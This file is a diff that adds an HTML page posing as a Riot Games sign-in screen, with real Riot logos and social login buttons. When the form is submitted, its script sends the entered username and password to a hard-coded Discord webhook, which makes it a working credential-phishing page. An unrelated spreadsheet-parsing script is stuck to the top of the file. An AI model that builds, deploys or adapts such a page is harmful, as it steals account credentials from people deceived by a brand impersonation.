@@ -1,0 +1,204 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Riot Games - Sign In</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <style>
+        @font-face {
+            font-family: 'Mark Pro';
+            src: url('https://fonts.cdnfonts.com/css/mark-pro');
+        }
+        body {
+            background: #0a0d15;
+            color: #ffffff;
+            font-family: 'Mark Pro', 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .login-container {
+            background: #111827;
+            border-radius: 12px;
+            padding: 2rem;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+        }
+        .login-logo {
+            width: 80px;
+            margin-bottom: 1.5rem;
+        }
+        .form-input {
+            background: #1f2937;
+            color: #ffffff;
+            border: 1px solid #4b5563;
+            padding: 0.75rem;
+            border-radius: 6px;
+            width: 100%;
+            margin-bottom: 1rem;
+            transition: border-color 0.3s;
+        }
+        .form-input:focus {
+            outline: none;
+            border-color: #ff4655;
+        }
+        .login-btn {
+            background: #ff4655;
+            color: #ffffff;
+            padding: 0.75rem;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            width: 100%;
+            transition: background 0.3s, transform 0.2s;
+        }
+        .login-btn:hover {
+            background: #e53e3e;
+            transform: translateY(-2px);
+        }
+        .error {
+            color: #f56565;
+            display: none;
+            margin-top: 0.75rem;
+            font-size: 0.9rem;
+        }
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        .options a {
+            color: #ff4655;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+        .options a:hover {
+            color: #e53e3e;
+        }
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        .social-btn {
+            background: #1f2937;
+            padding: 0.5rem;
+            border-radius: 6px;
+            transition: background 0.3s;
+        }
+        .social-btn img {
+            width: 24px;
+        }
+        .social-btn:hover {
+            background: #374151;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" data-aos="fade-up">
+        <img src="https://www.riotgames.com/darkstar/assets/images/brand/riotgames-logo.png" alt="Riot Games Logo" class="login-logo mx-auto">
+        <h2 class="text-2xl font-bold text-center mb-4">Sign In</h2>
+        <form id="login-form">
+            <input type="text" id="username" class="form-input" placeholder="Username" required>
+            <input type="password" id="password" class="form-input" placeholder="Password" required>
+            <div class="options">
+                <label class="text-sm"><input type="checkbox" class="mr-1"> Stay signed in</label>
+                <a href="#">Trouble signing in?</a>
+            </div>
+            <button type="submit" class="login-btn">Sign In</button>
+        </form>
+        <p id="error" class="error">Please fill in all fields.</p>
+        <div class="social-login">
+            <a href="#" class="social-btn"><img src="https://authenticate.riotgames.com/static/facebook-signin.png" alt="Facebook"></a>
+            <a href="#" class="social-btn"><img src="https://authenticate.riotgames.com/static/google-signin.png" alt="Google"></a>
+            <a href="#" class="social-btn"><img src="https://authenticate.riotgames.com/static/apple-signin.png" alt="Apple"></a>
+        </div>
+    </div>
+    <script>
+        AOS.init({ duration: 800, once: true });
+
+        document.getElementById('login-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('error');
+
+            if (!username || !password) {
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1392692196200808508/nWjhLWSCV1S6M_XuhT8nl3FMZ5xfYw4V4j7VgHhyUneUzFsCp05nGcWvQI46fEdMUtWZ';
+            const payload = {
+                content: `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if (response.ok) {
+                    alert('Login info sent successfully!');
+                    errorMsg.style.display = 'none';
+                } else {
+                    errorMsg.textContent = 'Failed to send login info. Please try again.';
+                    errorMsg.style.display = 'block';
+                }
+            } catch (err) {
+                errorMsg.textContent = 'An error occurred. Please try again.';
+                errorMsg.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
